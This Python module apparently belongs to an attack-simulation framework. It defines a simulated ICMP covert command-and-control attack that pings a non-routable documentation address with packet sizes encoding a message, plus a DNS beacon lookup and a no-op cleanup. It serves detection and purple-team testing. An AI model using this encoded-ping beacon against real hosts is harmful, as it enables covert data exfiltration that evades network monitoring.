# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: c2_icmp — Command and Control (TA0011)
T1095  Non-Application Layer Protocol
T1132  Data Encoding
T1132.001 Data Encoding: Standard Encoding

SAFE simulation: uses ping (ICMP echo) to a non-routable address as a covert
C2 channel, encoding data in the ICMP payload size/count pattern.
Requires NET_RAW capability (already present on gloamfire-ubuntu).
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "icmp-sim.gloamfire.invalid"

# RFC 5737 documentation range — guaranteed non-routable
_FAKE_C2 = "192.0.2.99"


@register
class C2IcmpAttack(BaseAttack):
    name = "c2_icmp"
    description = (
        "Simulate ICMP-based covert C2 channel with data-encoded ping traffic "
        "(T1095, T1132, T1132.001)"
    )
    mitre = ["T1095", "T1132", "T1132.001"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        c2_host = params.get("c2_host", _FAKE_C2)
        resolver = params.get("resolver", "8.8.8.8")

        script = f"""
echo "[Gloamfire] ICMP C2 simulation starting"

# T1095 — non-application-layer protocol: ICMP as C2 transport
# Vary packet size to encode a fake beacon (size = data value)
echo "[Gloamfire] Sending ICMP beacon sequence to {c2_host} (non-routable)"

# T1132.001 — encode 'HELLO' as packet sizes: 72 69 76 76 79
for size in 72 69 76 76 79; do
    ping -c 1 -W 1 -s $size {c2_host} 2>/dev/null || true
done

echo "[Gloamfire] ICMP beacon sequence sent (5 packets, encoded payload)"

# Demonstrate the encoding pattern (what a real attacker would do)
echo "[Gloamfire] Data encoding pattern: packet sizes encode ASCII values (T1132)"
python3 -c "
sizes = [72, 69, 76, 76, 79]
print('  Encoded message:', ''.join(chr(s) for s in sizes))
print('  NOTE: SIMULATION ONLY')
"
echo "[Gloamfire] ICMP C2 simulation complete"
"""
        result = self._exec(target, script)
        result.metadata["c2_host"] = c2_host

        self._exec(target, f"nslookup {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true")
        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class C2IcmpCleanup(BaseAttack):
    name = "c2_icmp_cleanup"
    description = "No persistent artefacts — no-op cleanup"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        return self._exec(target, "true")
